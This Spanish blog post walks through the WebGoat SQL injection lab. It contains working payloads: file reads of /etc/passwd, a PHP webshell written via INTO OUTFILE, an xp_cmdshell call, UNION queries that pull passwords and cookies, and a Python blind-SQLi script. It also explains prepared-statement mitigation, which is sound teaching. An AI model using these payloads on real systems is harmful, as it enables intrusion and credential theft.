---
title: WebGoat - A1 - SQL Injection Advanced
author: Christian Gutierrez
date: 2021-03-10 14:10:00 -0500
categories: [WebGoat, A1]
tags: [SQL-injection, blind-sql]
image: /assets/webgoat/A1/1_sql_injection/portada.PNG
---

## Introducción
En esta ocasión vamos a trabajar con un laboratorio de **SQL Injection - Advanced**, en el que realizaremos 2 tipos de ataque **SQL injection** interesantes y de nivel medio, como lo son: 
- SQL Injection Combined (básica)
- Blind SQL Injection (básica)

Estos ataques nos permitirán trabajar en la lógica que se debe implementar al momento de explotar una vulnerabilidad de **SQL Injection**, veremos el cómo por medio de distintos comportamientos y errores, se puede perfilar y afinar nuestro payload, al mismo tiempo que se puede automatizar, logrando la extracción de información interna de la **BD**. 

## SQL Injection
De forma general podemos definir la vulnerabilidad de **SQL Injection**, como la posibilidad de inyectar instrucciones **SQL** especialmente diseñadas para **alterar la intención o proposito de las consultas (querys)** predefinidas por el aplicativo, así pues, lo que inicialmente es una consulta **SQL** que realiza la busqueda de un usuario en la **BD**, al no poseer controles de seguridad adecuados, un atacante puede alterarla y convertirla en consultas a otras tablas internas, o realizar acciones de edición y eliminación, entre otras. 

Dependiendo el tipo de base de datos a la cual se le esten realizando las consultas desde el aplicativo vulnerable, las intrucciones y payloads que se inyectan pueden cambiar, esto debido a ciertas particularidades de cada motor de **BD** (Mysql, Oracle, MSSQL, etc), además existen distintos tipos de explotación que son circunstanciales, por lo que podemos categorizar los modos de explotación en las siguientes secciones: 
- Error-based SQLi
- In-band SQLi (Classic SQLi)
- Union-based SQLi
- Inferential SQLi (Blind SQLi)
- Boolean-based (content-based) Blind SQLi
- Time-based Blind SQLi
- Otras...

## Riesgos de seguridad
Esta es una de la vulnerabilidades de mayor impacto, debido a que se encuentra en muchos aplicativos a lo largo y ancho de internet, además del hecho de que es la puerta de entrada para otro tipo de explotaciones que en conjunto permitirían el compromiso del servidor, y hasta de otros activos internos. 

### **Consulta de información privada**
Uno de los principales riesgos asociados y quizás el más directo consiste en la posibilidad qur tiene un atacante de leer o consultar información de otras tablas en la **Base de Datos** que enlaza el aplicativo vulnerable. Esta lectura de información puede ir desde extraer datos de todos los usuarios del aplicativo, hasta identificar información de configuración almacenada en las **BD**. Es importante tener presente que las bases de datos son el corazón de los aplicativos actuales, ya que es donde se lleva registro de las operaciones y son el insumo principal para todos los servicios y acciones que se consumen día a día. 

### **Edición de información**
Similar al riesgo anterior, dependendiendo las circunstancias de la explotación del **SQLi** un atacante también puede editar información a nivel de base de datos, afectando así la integridad de todos los procesos que hagan uso de esta información. Pensemos por un momento en un sistema de puntos en el que nuestro registro de puntos actuales esta almacenado en **BD**, además utilizamos los puntos como sistema de cambio para algún servicio interno; si como atacantes logramos la alteración a nivel de **BD** de nuestra cantidad de puntos, para el aplicativo va a ser transparente por que de forma intrínseca confia en la información que esta le retorna. 

### **Lectura de archivos de O.S**
Dependiendo de la base de datos y los privilegios que tengamos en nuestra consulta vulnerable, un atacante puede hacer uso de los recursos del sistema para leer información a nivel de **Sistema Operativo**. Las implicaciones de esto pueden ir desde la lectura de archivos de configuración, hasta la recolección del código fuente del aplicativo, lo que eventualmente proporciona más vectores de ataque hacia el aplicativo o quizás la identificación terceros servicios que puedan ser vulnerables. 

- Mysql:
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2F6574632F706173737764);
```

### **Subir archivos maliciosos**
Unido al riesgo anterior, bajo las condiciones adecuadas del vector de ataque y los privilegios de la consulta vulnerable, es posible para un atacante escribir archivos a nivel de **Sistema Operativo**, lo que amplia el riesgo a posible sobreescritura de archivos criticos, o la subida de código malicioso como **webShell's**: 
- Mysql: 
```sql
SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'; 
```
Esto sube una webshell básica en php por medio de **Mysql**: 
``http://localhost/shell.php?c=cat%20/etc/passwd ``

### **Ejecución remota de comandos**
Dependiendo del sistema de bases de datos comprometido, es posible hacer uso de múltiples funcionalidades que permiten la ejecución de comando de sistema operativo por medio de consultas **SQL**: 

- MSSQL
    - Se debe habilitar el método [XP_CMDSHELL](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)
```sql
EXEC master.dbo.xp_cmdshell 'cmd'; 
```

## Laboratorios
### SQL Injection Advanced - 3
El reto nos indica que existen 2 tablas en la base de datos ``user_data`` y ``user_system_data``, y nos provee de 2 funcionalidades, una de consulta de información y otra de validación de credenciales: 

![Formulario Vulnerable](/assets/webgoat/A1/1_sql_injection/01_dos_funcionalidades.png)
_Formulario Vulnerable_

Vemos por el error o la caracteristica que nos indica la consulta realizada, que la funcionalidad ``Get Account Info`` hace un llamado a la tabla ``user_data``, sin embargo por los errores, se puede evidenciar una vulnerabilidad básica de **SQL Injection**, donde lo que inyectamos se concatena con la query original. 

![Payload Básico](/assets/webgoat/A1/1_sql_injection/02_payload_basico.png)
_Payload Básico_

El mensaje nos indica un error de **malformación** de la consulta debido a que se inyecta **Dave'**, lo que nos permite constatar que lo que inyectemos se esta interpretando a nivel de consulta.

Vamos a utilizar una técnicas de ``UNION SQL``, con la cual unimos contenido de la tabla  que pertenece a la consulta original con otra tabla, que es de donde queremos extraer la información. 

```sql
Dave’ UNION SELECT * FROM user_system_data -- 
```
![Error UNION](/assets/webgoat/A1/1_sql_injection/03_mismatch.png)
_Error UNION_

El mensaje de error nos señala que es posible realizar el ``UNION`` entre la ``tabla user_data`` y ``user_system_data``, sin embargo el numero de columnas **NO coincide** entre ambos resultados, por lo que no es posible agrupar la información; esto lo vemos evidenciado de igual manera revisando la estructura de ambas tablas: 

![Estructura tablas](/assets/webgoat/A1/1_sql_injection/04_estructura_tablas.png)
_Estructura tablas_

El número de columnas no es igual para ambas, así que podemos forzar la unión del maximo de columnas de las 2 tablas a unir, alterando e incluyendo valores estaticos en el ``SELECT``: 

- Se van agregando parametros nulos al select, hasta que se detecta un máximo de 7 parametros:
```sql
Dave’ UNION SELECT user_name,password,1,1,1,1,1 FROM user_system_data -- 
Dave’ UNION SELECT user_name,password,null,null,null,null,null FROM user_system_data -- 
```

![Error tipos incompatibles](/assets/webgoat/A1/1_sql_injection/05_incompatibles_tipos.png)
_Error tipos incompatibles_

Ahora el mensaje nos indica que los tipos a unir son incompatibles, por lo que no es posible realizar la unión entre por ejemplo, una string y valor númerico, etc. Esto se puede solucionar indicando en la posiciones algunos tipos de datos dinstintos hasta encontrar la combinación adecuada de acuerdo al orden en que estan estipulados en la estructura de la tabla: 

```sql
Dave’ UNION SELECT 1,user_name,password,'-','-',cookie,1 FROM user_system_data -- 
```

![Reto  - 3 - solucionado](/assets/webgoat/A1/1_sql_injection/06_reto3_solucionado.png)
_Reto  - 3 - solucionado_

Como se puede observar, por medio de una **SQL Injectión** se logro la consulta de información que estaba almacenada en una tabla distinta a la query original; utilizando una técnica de concatenación por ``UNION``, los resultados de la segunda tabla se agregan a los retornados por la consulta inicial. 

Dandole un vistazo un poco más general se puede concluir que las técnicas ``UNION`` permiten consultar todas las tablas de la base de datos, además de que las condiciones se pueden superar fácilmente por medio de prueba y error, o automatizando el proceso de coincidencia de columnas y una posible combinatoria para tratar con los tipos de datos correctos. 

### SQL Injection Advanced - 5 
En este reto vamos a trabajar con una **Blind SQL Injection**, el cual es un escenario en que el applicativo **NO** nos retorna información directa acerca del error ni la información consultada, por tanto es más complicado descubrir la estructura interna y sobre todo, más complicado extraer la información. 

Se nos plantea el escenario de una funcionalidad de consulta de articulos, que tiene como consulta principal lo siguiente: 
```sql
SELECT * FROM articles WHERE article_id = 4
```

Al inyectar sobre el parametro ``[VICTIM]?article=4 AND 1=1`` esto se concatena con la consulta inicial y es vulnerable a **SQLi**: 

```sql
SELECT * FROM articles WHERE article_id = 4 and 1 = 1
```

Sin embargo, el aplicativo **NO** retorna ningún error indicando algún problema con la sintaxis de la consulta, y ni ningún mensaje generico que haga referencia a la base datos. El único comportamiento que se tiene es el siguiente: 
- ``4 AND 1=1``
    - La aplicación funciona adecuadamente y nos despliega el articulo #4
- ``4 AND 1=2``
    - El aplicativo **NO** despliega el articulo #4. 

Este comportamiento nos permite considerar que para la primera consulta (**logicamente verdadera**) se esta interpretando lo que inyectamos, y para la segunda consulta ocurre lo mismo solo que la forma lógica siempre va a ser falsa, por lo que **NO** retorna un articulo. Basados en esta conducta sabemos de antemano que nuestros payload se estan interpretando, pero solo podemos hacer preguntas de verdadero o falso para distinguir un comportamiento de forma externa. 

> ¿Con preguntas de verdadero o falso se puede extraer información?

Claro que sí! es más lento, pero sí se puede. Imaginemos un momento los tipos de preguntas de verdadero o falso que se pueden usar para describir físicamente a una persona: 
- ¿Mide más de 1.70 metros?
- ¿Usa sombrero?
- ¿Usa lentes?
- ¿Tiene ojos de color azul?
- ¿Usa el cabello largo? 
- Etc.. 

Siguiendo con las preguntas anteriores se puede llegar a la descripción exacta de la persona, solo que requiere más tiempo, sin embargo cada respuesta verdadera o falsa nos aporta información para la siguiente pregunta, de esta manera hasta contemplar todas las posibles caracteristicas y llegar a un resultado conciso. 

Este mismo comportamiento se puede lograr a nivel de consulta de base de datos, no a modo de caracteristicas físicas sino mejor aún, sobre la composición o el contenido de algo interno. Ejemplo: 

- ¿La primera letra del contenido de la columna **password** es igual a '**b**'?: 
    - ``?article=4 AND substring(password,1,1) = 'b'``
    - ``substring(contenido, inicio, #caracteres) = letra_abecedario``.
    - De esta manera, si la respuesta es **falsa** debemos seguir preguntando si es igual a '**b**', sino '**c**', luego '**d**', '**e**', '**f**', etc.. hasta que se obtenga una respuesta verdadera y así sabremos cual es la primera letra del contenido de esa columna. 

Basados en lo anterior, entendemos que el comportamiento es preguntar **caracter por caracter** y cuando tengamos una respuesta verdadera, continuaremos con la siguiente posición, bastante similar a realizar una fuerza bruta o probar todas las posibles letras para ver cual coincide en dicha posición.

![Iteración con Substring](/assets/webgoat/A1/1_sql_injection/07_substring.PNG)
_Iteración con Substring_

De forma general, iterando entre las posiciones del contenido y preguntando si dicho valor corresponde al de una letra (que también se itera), podemos recopilar la información.  Recordemos que estamos haciendo uso de un operador ``AND``, lo que nos permite definir un filtro para cuando las condiciones se cumplen y otro para cuando la condición ``substring`` es falsa. 

![Filtro de respuestas](/assets/webgoat/A1/1_sql_injection/08_filtro_de_condiciones.png)
_Filtro de respuestas_

Cómo se puede observar, tenemos 2 posibles respuestas ante un payload que resulta verdadero o falso. Si la posición y la letra que estamos iterando coincide, el sistema nos retorna: 
- **Verdadero**: ``User {0} already exists please try to register with a different username``
- **Falso**:- ``User --payload-- created, please proceed to the login page``

Además, si revisamos con detenimiento el aplicativo vemos que se podría sacar un tercer mensaje de error en caso de que por ejemplo consultemos una posición que excede el tamaño del registro que queremos extraer: 
- Otra: ``Sorry the solution is not correct, please try again```

Considerando el comportamiento anterior y los filtros que se puede aplicar, se construye un script en python que replique y extraiga la información de la columna ``password``. 

![Solución al reto](/assets/webgoat/A1/1_sql_injection/09_resultado_blind_sqli.png)
_Solución al reto_


```python
import requests

url = "http://csl-devsec.westus2.azurecontainer.io:8080/WebGoat/SqlInjectionAdvanced/challenge"
cookie = "TU-COOKIE"
peticion = requests.Session()
peticion.headers.update({
    "Cookie": cookie
})

def visibilidad(req):
    tmp = req.get(url)
    if(tmp.status_code != 200):
        print("[-] No hay visibilidad con el objetivo.")
        exit()
    else:
        print("[+] Hay visibilidad! ;)")

def verf_resultado(respuesta):
    if("already exists please try" in respuesta["feedback"]):
        return True
    elif("Sorry the solution is not correct, please try again" in respuesta["feedback"]):
        print("[+] Proceso terminado")
        exit()
    return False

def request_vuln(req, payload):
    contenido = {
        "username_reg": payload,
        "email_reg": "test@test.com",
        "password_reg": "123456",
        "confirm_password_reg":"123456"
    }
    
    exploit = req.put(url, data=contenido)
    respuesta = exploit.json()
    
    return verf_resultado(respuesta)

def run():
    abc = "abcdefghijklmnopqrstuvxyz"
    solucion = ""
    limit = 30
    
    for i in range(1,limit):
        for letra in abc:
            payload = "tom\' AND substring(password,{},1)=\'{}".format(i, letra)
            if(request_vuln(peticion, payload)):
                solucion += letra
                print(solucion)
    
run()
```

#### Mitigación
En el proceso de mitigación de esta vulnerabilidad, ocurre algo muy curioso, por que se tienen 2 consultas a la base de datos, pero solo que una es vulnerable y la otra esta desarrollada de forma segura.
1. La primera consulta si el usuario a registrar ya existe o no. 
2. La segunda inserta los datos en la base de datos y crea el nuevo usuario.
- ``\webgoat-lessons\sql-injection\src\main\java\org\owasp\webgoat\sql_injection\advanced\SqlInjectionChallenge.java``

![Código Vulnerabilidad](/assets/webgoat/A1/1_sql_injection/10_codigo_vulnerabilidad.png)
_Código Vulnerabilidad_

Cómo se puede observar, la sección enmarcada en amarillo corresponde a vulnerabilidad que se da e una consulta a base de datos, debido a que esta concatena de forma directa el parametro ``username_reg`` el cual es controlado por el usuario. 

```java
String checkUserQuery = "select userid from sql_challenge_users where userid = '" + username_reg + "'";
```

De lo anterior le damos sentido al por qué la forma de nuestro **payload**, y el cómo al concatenar una entrada como ``tom\' AND substring(password,1,1)=\'a`` alteramos el sentido de la consulta: 

```java
String checkUserQuery = "select userid from sql_challenge_users where userid = 'tom' AND substring(password,1,1)='a'";
```

Sin embargo, la **query** enmarcada en verde es la que realiza la acción del registro del usuario en base de datos; pero esta **query** NO es vulnerable aunque reciba parametros del cliente, debido a que hace uso de **consultas preparadas**: 

```java
PreparedStatement preparedStatement = connection.prepareStatement("INSERT INTO sql_challenge_users VALUES (?, ?, ?)");
preparedStatement.setString(1, username_reg);
preparedStatement.setString(2, email_reg);
preparedStatement.setString(3, password_reg);
preparedStatement.execute();
```

Esta forma es adecuada para evitar vulnerabilidades de tipo **SQL Injection**, debido a que inicialmente construimos la consulta y le indicamos con ``?`` dónde irán los parametros dinamicos (muy similar a un ``.format()`` de python); así pues, posteriormente se le señala durante la consutrcción de toda la consulta, qué dato forma parte de la lógica y cuál corresponde a contenido estatico, evitando que si alguien inyecta un comando SQL, este se no interprete. 

Otras mitigaciones: 
- Utilizar procesos almacenados.
- Sanitizar el contenido de los parametros dinamicos antes de inyectarlos a una consulta. 
- Utilización de un ORM
    - Java: Hibernate
    - C#: Entity framework
    - Python: Django


## Referencias
1. [SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)
2. [Explotar el XP_CMDSHELL](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)
3. [Query Parameterization - Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)